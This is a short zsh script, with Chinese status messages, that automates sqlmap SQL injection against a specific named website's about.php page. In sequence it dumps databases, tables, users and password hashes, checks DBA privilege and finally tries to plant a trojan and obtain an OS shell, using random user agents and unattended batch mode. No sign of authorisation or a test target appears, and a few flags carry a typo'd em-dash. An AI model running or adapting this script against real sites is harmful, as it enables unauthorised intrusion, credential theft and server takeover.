# !/bin/zsh
url="http://www.delphilaser.com/about.php?id=2"
sqlmap_path="/Users/mac/bin/sqlmap/sqlmap.py"
echo "尝试获取所有数据库名:"
cmd="python3 ${sqlmap_path} -u ${url} --dbs —-random-agent --batch"
echo $cmd
${cmd}
echo "尝试获取所有表名:"
cmd="python3 ${sqlmap_path} -u ${url} --tables —-random-agent --batch"
echo $cmd
${cmd}
echo "尝试获取所有用户:"
cmd="python3 ${sqlmap_path} -u ${url} --users --random-agent --batch"
echo $cmd
${cmd}
echo "尝试获取账号密码:"
cmd="python3 ${sqlmap_path} -u ${url} --password --random-agent --batch"
echo $cmd
${cmd}
echo "尝试获取当前用户:"
cmd="python3 ${sqlmap_path} -u ${url} --current-user --random-agent --batch"
echo $cmd
${cmd}
echo "测试当前用户权限:"
cmd="python3 ${sqlmap_path} -u ${url} --is-dba --random-agent --batch"
echo $cmd
${cmd}
echo "尝试写入木马,getshell"
cmd="python3 ${sqlmap_path} -u ${url} --os-shell --random-agent --batch"
echo $cmd
${cmd}